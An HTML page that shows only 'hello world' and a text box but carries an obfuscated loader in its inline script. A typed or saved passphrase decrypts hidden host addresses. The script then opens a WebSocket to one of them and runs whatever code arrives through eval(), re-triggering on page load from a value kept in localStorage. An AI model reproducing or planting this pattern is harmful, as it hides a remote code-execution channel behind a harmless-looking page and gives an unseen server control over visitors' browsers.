<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>d0b3.github.io</title>
    <style>
      html, body { margin: 0; height: 100%; }
      body {
        display: flex;
        flex-flow: column;
        align-items: center;
        justify-content: center;
        background: #fefbf7;
        color: #a0bcc2;
      }
      textarea {
        width: 480px;
        height: 320px;
      }
    </style>
    <script type="module">

      await new Promise(r => addEventListener('DOMContentLoaded', r, { once: true }));

      async function sha (t) { return new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(t))); };
      async function dec (sock, salt, pass) {
    sock = new Uint8Array(sock.match(/.{2}/g).map(s=>parseInt(s, 16)));
    const flp = await sha(salt+pass+salt);
    for (let i = 0; i < sock.length; i++) sock[i] ^= flp[i%flp.length];
    try {
      const host = new TextDecoder().decode(sock.slice(32)).trim(),
            chk = await sha(host);
      for (let i = 0; i < chk.length; i++) if (chk[i] !== sock[i]) return;
      return 'ws'+host.slice(4)+'/'+[...flp].map(b=>b.toString(16).padStart(2,'0')).join('');
    } catch { }
  };

      const SOCK = ["2f9350d77fab9dc434fa533633c361d9bfa12099205417c9355468c9ed5103d0f5521b8770e4e2e6b851cc40b2eb3b227781726466ecefa8147119396e388ae8b00052c63cffbbffa945980ae9ed2a686a9d6a7573aef7ad19780a38267b88f3b8521b8770acb6","67a8961576b2972a1574792e96ee1ed9664fb89373495b6d1ff5bf8c3fe7af69bd69dd4579b5f4089ddcaf4d17865934a368e57d3ea5e30034ded97de2ce2a44e92c8f0c38f9ef5184cdbb195ddd5f25e975f9652fb0a11831d3d06ee3866946f224dd4579b5bc5cc9","b1c2a641823f9d20ab6cf8f26f5eb0b9e91e3272b7129b3fa083eeff2b1eb44f6b03ed118d38b61e23c02dd8fb36b7493a346893e9f5771287a28619f769716e2a57a843c479fa057ad93cccaf7cec4f2b7e758ff1e462509fa78b10e468392d284ca0118d38b6567794"];

      const $ta = document.querySelector('textarea');
      try { $ta.value = localStorage.getItem('value') || ''; } catch { };

      $ta.onchange = $ta.onkeyup = async () => {
        const value = $ta.value.trim();
        if (!value) return;
        for (const sock of SOCK) {
          const url = await dec(sock, "whatever", value);
          if (url) {
            $ta.value = 'connecting';
            localStorage.setItem('value', value);
            const socket = new WebSocket(url);
            socket.binaryType = 'arraybuffer';
            socket.onmessage = ev => { eval(new TextDecoder().decode(ev.data))(socket); };
            socket.onerror = () => { $ta.value = 'vodafone m√ºde'; };
            return;
          }
        }
      };

      $ta.onchange();

    </script>
  </head>
  <body>
    <h1>hello world</h1>
    <textarea></textarea>
  </body>
</html>